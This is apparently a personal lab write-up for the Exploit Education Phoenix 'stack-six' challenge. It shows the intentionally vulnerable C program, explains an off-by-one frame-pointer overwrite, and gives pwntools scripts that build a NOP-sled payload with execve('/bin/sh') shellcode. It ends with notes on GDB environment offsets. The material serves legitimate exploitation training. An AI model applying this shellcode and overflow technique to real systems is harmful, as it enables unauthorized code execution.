Source

```c
/*
 * phoenix/stack-six, by https://exploit.education
 *
 * Can you execve("/bin/sh", ...) ?
 *
 * Why do fungi have to pay double bus fares? Because they take up too
 * mushroom.
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *what = GREET;

char *greet(char *who) {
  char buffer[128];
  int maxSize;

  maxSize = strlen(who);
  if (maxSize > (sizeof(buffer) - /* ensure null termination */ 1)) {
    maxSize = sizeof(buffer) - 1;
  }

  strcpy(buffer, what);
  strncpy(buffer + strlen(buffer), who, maxSize);

  return strdup(buffer);
}

int main(int argc, char **argv) {
  char *ptr;
  printf("%s\n", BANNER);

#ifdef NEWARCH
  if (argv[1]) {
    what = argv[1];
  }
#endif

  ptr = getenv("ExploitEducation");
  if (NULL == ptr) {
    // This style of comparison prevents issues where you may accidentally
    // type if(ptr = NULL) {}..

    errx(1, "Please specify an environment variable called ExploitEducation");
  }

  printf("%s\n", greet(ptr));
  return 0;
}
```

# Solution

We can fill up the buffer and overflow a single byte after the `strdup`

![](_attachments/Pasted%20image%2020230402100358.png)

![](_attachments/Pasted%20image%2020230402100321.png)

Perhaps we can manipulate this overflow to point back to the address of our environment variable

To find that, I used the following steps:

![](_attachments/Pasted%20image%2020230402105904.png)

I had to add 0x10 to the address, to skip the `ExploitEducation=` prefix, which leaves us with the address:
`0x0x7fffffffef10`

Because we can manipulate the last byte of the "buffer"/return address, lets check if our code is somwhere within this range `0x0x7fffffffe500 - 0x0x7fffffffe5ff`:
![](_attachments/Pasted%20image%2020230402105729.png)


![](_attachments/Pasted%20image%2020230402112141.png)

So when we return, we need to see if we can manipulate the address to be 0x00007fffffffe510. This will jump to our shellcode, probably should include a couple of nop's to make it line up correctly and then some real shellcode. 

You can see if we changed to value of RBP to `0x..a0`, itll jump to our shellcode.

Lets mod the shellcode to be `\x90 * 126 + \x10`

```python
from pwn import *

buf = b"\x90" * 126 + "\xa0"

print(buf)
```

![](_attachments/Pasted%20image%2020230402110541.png)
When we now break at main, we can see RBP is now pointing to our shellcode.
Lets change up the shellcode to be a real one..

```python
from pwn import *

shellcode = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

# build the payload - with a small nop sled
payload = b"\x90" * 20
payload += shellcode
payload += b"A" * (126 - len(payload))
# overwrite RIP byte
payload += b"\xa0"

print(payload)
```

So now when we run the program, it jumps into our shellcode

![](_attachments/Pasted%20image%2020230402112619.png)

However when running the program for real, we get a segfault.. probably due to changing environment variables and such, lets check it

![](_attachments/Pasted%20image%2020230402113510.png)
![](_attachments/Pasted%20image%2020230402113538.png)

Within GDB, the  _ environment variable is different.. causing different it to be at different memory addresses. Lets fix it up within gdb.

![](_attachments/Pasted%20image%2020230402113716.png)


I now have to go through and re-find all of the memory addresses and offsets :/

![](_attachments/Pasted%20image%2020230402115544.png)

After changing some env variables, and running with absolute paths as well as setting .gdbinit stuff i still get different memory addreses.

The fix i had is to invoke the binary with absolute paths.

```python
import sys
from pwn import *

shellcode = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

# build the payload - with a small nop sled
payload = b"\x90" * 30
payload += shellcode
payload += b"A" * (126 - len(payload))
# overwrite RIP byte
payload += b"\xa0"

sys.stdout.buffer.write(payload)
```

![](_attachments/Pasted%20image%2020230402120351.png)

I'd still like a guide on fixing the env properly so it works within gdb and without.

